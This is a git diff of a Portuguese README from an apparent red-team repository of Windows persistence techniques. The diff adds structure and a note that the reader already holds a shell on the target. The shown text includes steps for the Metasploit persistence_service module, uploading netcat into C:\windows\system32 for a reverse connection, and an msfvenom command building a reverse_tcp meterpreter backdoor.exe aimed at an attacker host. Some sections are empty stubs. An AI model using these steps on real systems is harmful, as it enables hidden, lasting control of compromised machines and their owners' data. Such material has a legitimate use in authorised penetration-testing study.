@@ -6,6 +6,8 @@
 
 Eu sou o Stux e estarei constantemente atualizando este repositório com novas técnicas para Windows Persistence!
 
+**Obs: Todos os processos de persistência partem do princípio de que você já possui uma shell ou acesso ao ambiente**
+
 ## Sumário
  - [Persistence Service](https://github.com/Stuuxx/awesome-persistence#persistence-service)
  - [Persistence Registry](https://github.com/Stuuxx/awesome-persistence/blob/main/README.md#persistence-registry)
@@ -19,7 +21,11 @@ Eu sou o Stux e estarei constantemente atualizando este repositório com novas t
 
 ### Persistence Service
 ----------------------------------------------------------------------------------
-Já com o alvo explorado e com uma shell meterpreter:
+
+Overview:
+Essa técnica tem como objetivo criar um serviço persistente no windows explorado na qual executará diversas vezes o payload de conexão reversa.
+
+Etapas:
 - Colocar a sessão em background;
 - Utilizar e configurar o módulo exploit/windows/local/persistence_service do metasploit;
 
@@ -55,7 +61,10 @@ Para prova de conceito, iremos dar um reboot na máquina explorada e aguardar a 
 
 ### Netcat
 ----------------------------------------------------------------------------------
-Já com o alvo explorado e com uma shell meterpreter:
+
+Overview:
+
+Etapas:
 - Vamos realizar o upload do netcat para algum diretório do alvo.
 ```bash
 upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
@@ -86,7 +95,10 @@ nc IP PORTA
 
 ### RDP
 ----------------------------------------------------------------------------------
-Já com o alvo explorado e com uma shell meterpreter:
+
+Overview: 
+
+Etapas:
 - 
 -
 
@@ -98,7 +110,9 @@ Já com o alvo explorado e com uma shell meterpreter:
 
 ### Schtasks - Log Events
 ----------------------------------------------------------------------------------
-Já com o alvo explorado e com uma shell meterpreter:
+Overview:
+
+Etapas:
 - Vamos iniciar criando um backdoor via msfvenom.
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=SEUIP LPORT=4444 -f exe > backdoor.exe
